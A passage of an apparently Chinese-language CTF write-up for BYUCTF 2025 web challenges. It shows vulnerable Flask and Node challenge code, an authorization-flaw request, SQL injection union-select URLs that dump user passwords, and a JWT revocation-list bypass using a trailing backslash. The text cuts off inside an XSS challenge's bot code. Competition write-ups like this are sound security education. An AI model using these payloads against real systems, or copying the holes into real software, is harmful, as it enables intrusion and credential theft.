class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">### IMPORTS ###</span></span><br><span class="line"><span class="keyword">import</span> flask, redis, os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### INITIALIZATIONS ###</span></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = os.urandom(<span class="number">32</span>).<span class="built_in">hex</span>()</span><br><span class="line">HOST = <span class="string">&quot;redthis-redis&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### HELPER FUNCTIONS ###</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getData</span>(<span class="params">key</span>):</span><br><span class="line">    db = redis.Redis(host=HOST, port=<span class="number">6379</span>, decode_responses=<span class="literal">True</span>)</span><br><span class="line">    value = db.get(key)</span><br><span class="line">    <span class="keyword">return</span> value</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getAdminOptions</span>(<span class="params">username</span>):</span><br><span class="line">    adminOptions = []</span><br><span class="line">    <span class="keyword">if</span> username != <span class="literal">None</span> <span class="keyword">and</span> username == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">        db = redis.Redis(host=HOST, port=<span class="number">6379</span>, decode_responses=<span class="literal">True</span>)</span><br><span class="line">        adminOptions = db.json().get(<span class="string">&quot;admin_options&quot;</span>, <span class="string">&quot;$&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> adminOptions</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### ROUTES ###</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">root</span>():</span><br><span class="line">    username = flask.session.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    adminOptions = getAdminOptions(username)</span><br><span class="line">    <span class="keyword">return</span> flask.render_template(<span class="string">&#x27;index.html&#x27;</span>, adminOptions=adminOptions)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># get quote </span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/get_quote&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getQuote</span>():</span><br><span class="line">    username = flask.session.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    person = flask.request.form.get(<span class="string">&#x27;famous_person&#x27;</span>)</span><br><span class="line">    quote = [person, <span class="string">&#x27;&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> person <span class="keyword">and</span> username != <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">        quote[<span class="number">1</span>] = <span class="string">&quot;Nope&quot;</span></span><br><span class="line">    <span class="keyword">else</span>: </span><br><span class="line">        quote[<span class="number">1</span>] = getData(person)</span><br><span class="line">    adminOptions = getAdminOptions(username)</span><br><span class="line">    <span class="keyword">return</span> flask.render_template(<span class="string">&#x27;index.html&#x27;</span>, adminOptions=adminOptions, quote=quote)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="comment"># return register page </span></span><br><span class="line">    <span class="keyword">if</span> flask.request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        error = flask.request.args.get(<span class="string">&#x27;error&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> flask.render_template(<span class="string">&#x27;register.html&#x27;</span>, error=error)</span><br><span class="line"></span><br><span class="line">    username = flask.request.form.get(<span class="string">&quot;username&quot;</span>).lower()</span><br><span class="line">    password = flask.request.form.get(<span class="string">&quot;password&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">## error check</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> username <span class="keyword">or</span> <span class="keyword">not</span> password:</span><br><span class="line">        <span class="keyword">return</span> flask.redirect(<span class="string">&#x27;/register?error=Missing+fields&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">## if username already exists return error</span></span><br><span class="line">    isUser = getData(username)</span><br><span class="line">    <span class="keyword">if</span> isUser:</span><br><span class="line">        <span class="keyword">return</span> flask.redirect(<span class="string">&#x27;/register?error=Username+already+taken&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># insert new user and password</span></span><br><span class="line">        db = redis.Redis(host=HOST, port=<span class="number">6379</span>, decode_responses=<span class="literal">True</span>)</span><br><span class="line">        <span class="comment"># db.set(username, &quot;User&quot;) # nah, we don&#x27;t want to let you write to the db :)</span></span><br><span class="line">        passwordKey = username + <span class="string">&quot;_password&quot;</span></span><br><span class="line">        <span class="comment"># db.set(passwordKey, password) # nah, we don&#x27;t want to let you write to the db :)</span></span><br><span class="line">        flask.session[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line">        <span class="keyword">return</span> flask.redirect(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">     <span class="comment"># return register page </span></span><br><span class="line">    <span class="keyword">if</span> flask.request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        error = flask.request.args.get(<span class="string">&#x27;error&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> flask.render_template(<span class="string">&#x27;login.html&#x27;</span>, error=error)</span><br><span class="line">    </span><br><span class="line">    username = flask.request.form.get(<span class="string">&quot;username&quot;</span>).lower()</span><br><span class="line">    password = flask.request.form.get(<span class="string">&quot;password&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">## error check</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> username <span class="keyword">or</span> <span class="keyword">not</span> password:</span><br><span class="line">        <span class="keyword">return</span> flask.redirect(<span class="string">&#x27;/login?error=Missing+fields&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># check username and password</span></span><br><span class="line">    dbUser = getData(username)</span><br><span class="line">    dbPassword = getData(username + <span class="string">&quot;_password&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> dbUser == <span class="string">&quot;User&quot;</span> <span class="keyword">and</span> dbPassword == password:</span><br><span class="line">        flask.session[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line">        <span class="keyword">return</span> flask.redirect(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> flask.redirect(<span class="string">&#x27;/login?error=Bad+login&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">1337</span>, debug=<span class="literal">False</span>, threaded=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>稍微看了一下代码，核心逻辑还是越权，但是这个代码逻辑的判断是有问题的</p>
<p><img src="/../images/achieve/2025/5/BYUCTF2025/QQ20250518-110355.jpg" alt="1"></p>
<p><code>getData</code>直接return了，查询的时候又写个and，<code>dbPassword = getData(username + &quot;_password&quot;)</code>这里得知怎么查询<code>admin</code>的密码</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/get_quote</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>redthis.chal.cyberjousting.com</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br><span class="line"></span><br><span class="line"><span class="language-ini"><span class="attr">famous_person</span>=admin_password</span></span><br></pre></td></tr></table></figure>

<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/get_quote</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>redthis.chal.cyberjousting.com</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=eyJ1c2VybmFtZSI6ImFkbWluIn0.aClO5g._S3TLBUJbAcEqasx_XMZq9xK3EM</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br><span class="line"></span><br><span class="line"><span class="language-ini"><span class="attr">famous_person</span>=flag_7392ilj8i32</span></span><br></pre></td></tr></table></figure>

<h2 id="Cooking-Flask"><a href="#Cooking-Flask" class="headerlink" title="Cooking Flask"></a>Cooking Flask</h2><p>经过测试发现是Sql注入，只不过这里列数比较多</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://cooking.chal.cyberjousting.com/search?recipe_name=&amp;description=&amp;tags=&#x27; ) union select 1,2,3,4 from user--+</span><br></pre></td></tr></table></figure>

<p><img src="/../images/achieve/2025/5/BYUCTF2025/QQ20250518-103511.jpg" alt="1"></p>
<p>判断出来是八列之后，不然列名为<code>int</code>，我们挨个换就好了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://cooking.chal.cyberjousting.com/search?recipe_name=&amp;description=&amp;tags=&#x27; ) union select 1,username,&#x27;2023-01-01&#x27;,3,password,password,&#x27;[]&#x27;,1 from user--+</span><br></pre></td></tr></table></figure>

<p>调试的时间很长</p>
<h2 id="JWTF"><a href="#JWTF" class="headerlink" title="JWTF"></a>JWTF</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># imports</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, redirect, make_response, jsonify</span><br><span class="line"><span class="keyword">import</span> jwt, os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># initialize flask</span></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">FLAG = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">APP_SECRET = os.urandom(<span class="number">32</span>).<span class="built_in">hex</span>()</span><br><span class="line">ADMIN_SECRET = os.urandom(<span class="number">32</span>).<span class="built_in">hex</span>()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;ADMIN_SECRET: <span class="subst">&#123;ADMIN_SECRET&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># JRL - JWT Revocation List</span></span><br><span class="line">jrl = [</span><br><span class="line">    jwt.encode(&#123;<span class="string">&quot;admin&quot;</span>: <span class="literal">True</span>, <span class="string">&quot;uid&quot;</span>: <span class="string">&#x27;1337&#x27;</span>&#125;, APP_SECRET, algorithm=<span class="string">&quot;HS256&quot;</span>)</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># main</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    resp = make_response(<span class="string">&#x27;Hello World!&#x27;</span>)</span><br><span class="line">    resp.set_cookie(<span class="string">&#x27;session&#x27;</span>, jwt.encode(&#123;<span class="string">&quot;admin&quot;</span>: <span class="literal">False</span>&#125;, APP_SECRET, algorithm=<span class="string">&quot;HS256&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="comment"># get admin cookie if you know the secret</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/get_admin_cookie&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_admin_cookie</span>():</span><br><span class="line">    secret = request.args.get(<span class="string">&#x27;adminsecret&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">    uid = request.args.get(<span class="string">&#x27;uid&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> secret <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> uid <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> uid == <span class="string">&#x27;1337&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> secret == ADMIN_SECRET:</span><br><span class="line">        resp = make_response(<span class="string">&#x27;Cookie has been set.&#x27;</span>)</span><br><span class="line">        resp.set_cookie(<span class="string">&#x27;session&#x27;</span>, jwt.encode(&#123;<span class="string">&quot;admin&quot;</span>: <span class="literal">True</span>, <span class="string">&quot;uid&quot;</span>: uid&#125;, APP_SECRET, algorithm=<span class="string">&quot;HS256&quot;</span>))</span><br><span class="line">        <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="comment"># get flag if you are an admin</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/flag&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>():</span><br><span class="line">    session = request.cookies.get(<span class="string">&#x27;session&#x27;</span>, <span class="literal">None</span>).strip().replace(<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> session <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># check if the session is in the JRL</span></span><br><span class="line">    <span class="keyword">if</span> session <span class="keyword">in</span> jrl:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload = jwt.decode(session, APP_SECRET, algorithms=[<span class="string">&quot;HS256&quot;</span>])</span><br><span class="line">        <span class="keyword">if</span> payload[<span class="string">&#x27;admin&#x27;</span>] == <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">return</span> FLAG</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> redirect(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># retrieve the JRL</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/jrl&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">jrl_endpoint</span>():</span><br><span class="line">    <span class="keyword">return</span> jsonify(jrl)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">1337</span>, threaded=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>本地起了一个测试，发现只要能够得到key就可以得到flag，但是key是64为的，不可能绕过，所以肯定有解析漏洞可以让我们得到flag，于是一直测试，发现</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> jwt.utils <span class="keyword">import</span> base64url_decode</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> base64url_decode(<span class="string">&#x27;&#x27;&#x27;eyJhZG1pbiI6dHJ1ZSwidWlkIjoiMTMzNyJ9&#x27;&#x27;&#x27;</span>)== base64url_decode(<span class="string">&#x27;&#x27;&#x27;eyJhZG1pbiI6dHJ1ZSwidWlkIjoiMTMzNyJ9\\&#x27;&#x27;&#x27;</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="number">11</span>)</span><br></pre></td></tr></table></figure>

<p>可以绕过</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/flag</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>jwtf.chal.cyberjousting.com</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">sec-ch-ua</span><span class="punctuation">: </span>&quot;Chromium&quot;;v=&quot;136&quot;, &quot;Google Chrome&quot;;v=&quot;136&quot;, &quot;Not.A/Brand&quot;;v=&quot;99&quot;</span><br><span class="line"><span class="attribute">sec-ch-ua-mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">sec-ch-ua-platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>same-site</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br, zstd</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6dHJ1ZSwidWlkIjoiMTMzNyJ9.BnBYDobZVspWbxu4jL3cTfri_IxNoi33q-TRLbHV-ew\\</span><br><span class="line"><span class="attribute">sec-fetch-user</span><span class="punctuation">: </span>?1</span><br><span class="line"><span class="attribute">referer</span><span class="punctuation">: </span>https://ctfd.cyberjousting.com/</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Wembsoncket"><a href="#Wembsoncket" class="headerlink" title="Wembsoncket"></a>Wembsoncket</h2><p>一道XSS的题目</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// puppeteerUtils.js</span></span><br><span class="line"><span class="keyword">const</span> puppeteer = <span class="built_in">require</span>(<span class="string">&#x27;puppeteer&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Secret key for signing JWT</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">JWT_SECRET</span> = fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;secret.txt&#x27;</span>, <span class="string">&#x27;utf8&#x27;</span>).<span class="title function_">trim</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// Admin cookie for authentication</span></span><br><span class="line"><span class="keyword">const</span> adminCookie = jwt.<span class="title function_">sign</span>(&#123; <span class="attr">userId</span>: <span class="string">&#x27;admin&#x27;</span> &#125;, <span class="variable constant_">JWT_SECRET</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Function to visit a URL using Puppeteer</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">visitUrl</span> = <span class="keyword">async</span> (<span class="params">url</span>) =&gt; &#123;</span><br><span class="line">  <span class="comment">// console.log(&#x27;Visiting URL:&#x27;, url);</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> browser;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    browser = <span class="keyword">await</span> puppeteer.<span class="title function_">launch</span>(&#123;</span><br><span class="line">      <span class="attr">headless</span>: <span class="string">&quot;new&quot;</span>,</span><br><span class="line">      <span class="attr">pipe</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="attr">dumpio</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="attr">args</span>: [</span><br><span class="line">        <span class="string">&#x27;--no-sandbox&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;--disable-gpu&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;--disable-software-rasterizer&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;--disable-dev-shm-usage&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;--disable-setuid-sandbox&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;--js-flags=--noexpose_wasm,--jitless&#x27;</span>,</span><br><span class="line">      ]</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// console.log(&#x27;Opening page&#x27;);</span></span><br><span class="line">    <span class="keyword">const</span> page = <span class="keyword">await</span> browser.<span class="title function_">newPage</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">await</span> page.<span class="title function_">setUserAgent</span>(<span class="string">&#x27;puppeteer&#x27;</span>);</span><br><span class="line">      <span class="keyword">let</span> cookies = [&#123;</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&#x27;token&#x27;</span>,</span><br><span class="line">        <span class="attr">value</span>: adminCookie,</span><br><span class="line">        <span class="attr">domain</span>: <span class="string">&#x27;wembsoncket.chal.cyberjousting.com&#x27;</span>,</span><br><span class="line">        <span class="attr">httpOnly</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="attr">sameSite</span>: <span class="string">&#x27;None&#x27;</span>,</span><br><span class="line">        <span class="attr">secure</span>: <span class="literal">true</span></span><br><span class="line">      &#125;];</span><br><span class="line">      <span class="comment">// console.log(&#x27;Setting cookies:&#x27;, cookies);</span></span><br><span class="line">      <span class="keyword">await</span> page.<span class="title function_">setCookie</span>(...cookies);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">let</span> statusCode = <span class="literal">null</span>;</span><br><span class="line">      page.<span class="title function_">on</span>(<span 